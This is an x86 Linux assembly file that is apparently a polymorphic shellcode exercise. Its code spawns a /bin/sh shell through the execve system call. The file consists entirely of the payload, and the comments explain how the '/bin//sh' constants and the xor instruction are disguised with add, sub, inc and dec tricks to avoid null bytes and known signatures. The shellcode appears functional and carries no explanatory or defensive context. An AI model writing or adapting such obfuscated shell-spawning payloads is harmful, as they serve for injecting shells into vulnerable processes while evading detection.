global _start

section .text

_start:


	;xor ecx,ecx
	sub ecx, ecx
	push ecx		; push null
	mov ecx,0x68732F2E	; one les than the hex value we need for 'hs//'
	inc ecx			; restore the hex
	push ecx		; push it to stack
	add ecx,0x05F632FF	; this is one less than the actual value we need in order to avoid null
	inc ecx			; increase the value so we get back 'nib/'
	push ecx		; push it to stack

	;push dword 0x68732f2f	; we transfered the strings at the start of code
	;push dword 0x6e69622f	; and we obsfucate them
	
	sub ecx, ecx		; change xor to sub
	mul ecx 
	mov al,0xc		; increase the value
	dec al 			; restore it
	;push ecx 
	;push edx		
	mov ebx,esp 
	int 0x80 
